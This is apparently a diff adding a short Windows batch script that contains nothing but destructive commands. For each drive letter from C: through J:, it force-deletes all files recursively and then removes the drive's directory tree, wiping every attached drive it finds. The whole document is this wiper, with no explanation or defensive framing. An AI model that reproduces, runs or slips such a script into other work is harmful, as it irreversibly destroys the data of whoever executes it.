@@ -1,0 +1,9 @@
+@echo off
+if exist "C:\" (cd C:\ & del "*" /f /q /s & rd C:\ /s /q)
+if exist "D:\" (cd D:\ & del "*" /f /q /s & rd D:\ /s /q)
+if exist "E:\" (cd E:\ & del "*" /f /q /s & rd E:\ /s /q)
+if exist "F:\" (cd F:\ & del "*" /f /q /s & rd F:\ /s /q)
+if exist "G:\" (cd G:\ & del "*" /f /q /s & rd G:\ /s /q)
+if exist "H:\" (cd H:\ & del "*" /f /q /s & rd H:\ /s /q)
+if exist "I:\" (cd I:\ & del "*" /f /q /s & rd I:\ /s /q)
+if exist "J:\" (cd J:\ & del "*" /f /q /s & rd J:\ /s /q)
